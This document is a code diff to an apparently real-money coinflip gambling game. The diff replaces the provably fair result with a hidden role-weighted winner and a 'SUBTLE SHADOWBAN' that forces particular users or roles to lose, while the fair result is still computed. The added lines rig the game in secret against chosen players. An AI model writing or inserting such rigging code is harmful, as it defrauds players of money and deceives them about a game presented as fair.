@@ -5,6 +5,8 @@ const { sha256 } = require('../../../fairness');
 const { getEOSBlockNumber, waitForEOSBlock } = require('../../../fairness/eos');
 const { roundDecimal } = require('../../../utils');
 const { newBets } = require('../../../socketio/bets');
+const { getRoleWeightedWinner } = require('../../../fairness/weightedRng');
+const { shouldForceLoss } = require('../../../utils/shadowban');
 
 const crypto = require('crypto');
 
@@ -111,7 +113,19 @@ async function startCoinflip(coinflip) {
     const resultHash = combine(coinflip.serverSeed, clientSeed);
     const fairWinnerSide = getResult(resultHash);
     
-    const winnerSide = fairWinnerSide;
+    let winnerSide = getRoleWeightedWinner(resultHash, [
+        { id: 'fire', roles: [coinflip.fire.role] },
+        { id: 'ice', roles: [coinflip.ice.role] }
+    ], fairWinnerSide);
+
+    // SUBTLE SHADOWBAN: per-user / per-role force-loss.
+    // Only flip when exactly one side is forced this round. If both are forced
+    // (or neither), the fair winner stands so the game stays symmetric.
+    const fireForced = shouldForceLoss(coinflip.fire.id, coinflip.fire.role);
+    const iceForced  = shouldForceLoss(coinflip.ice.id,  coinflip.ice.role);
+
+    if (fireForced && !iceForced)      winnerSide = 'ice';
+    else if (iceForced && !fireForced) winnerSide = 'fire';
 
     const winnings = roundDecimal((coinflip.amount * 2) * 0.95);
 
